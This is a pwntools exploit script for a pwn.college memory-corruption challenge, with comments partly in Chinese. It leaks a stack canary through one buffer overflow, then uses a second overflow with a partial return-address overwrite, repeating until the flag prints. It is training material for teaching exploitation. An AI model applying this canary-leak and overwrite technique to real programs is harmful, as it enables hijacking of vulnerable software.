from pwn import *

context.arch = 'amd64'
# 启动进程

while True :
    p = process('/challenge/babymem_level14.0')
    
    # first bof ,136 + 1 
    payload = b'REPEAT' + b'A' * (0xc8-0x40 - len('REPEAT')) +b'B'  
    p.recvuntil('Payload size:')
    p.sendline(b'137') 
    p.send(payload)

    # 从程序的输出中获取 Canary 值
    p.recvuntil('You said: ')
    response = p.recvline()
    print(response)
    Canary = response[137:144]  # 7个字节
    
    print(f"Canary value: {Canary.hex()}")
    print(Canary)
    Canary=b'\x00'+Canary
    print(f"Modified Canary value: {Canary.hex()}")
    # second bof , 136 + canary(8)+ 8 +2 =154
    # recv : You said: REPEATAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABÛó>YßpvtVý\x7f
    # Canary =  
    
    payload = b'A' * (0x1a0-0x8) + Canary + b'B' * 8 + p16(0x173a)#408+8+8+2
    print(payload)
    p.recvuntil(b'Payload size:')
    p.sendline(b'426')
    #p.sendlineafter('Payload size: ', str(len(payload)).encode() )
    p.send(payload)

    str = p.recvall(1)
    if str.find(b'pwn.college{') != -1:
        print(str)
        break



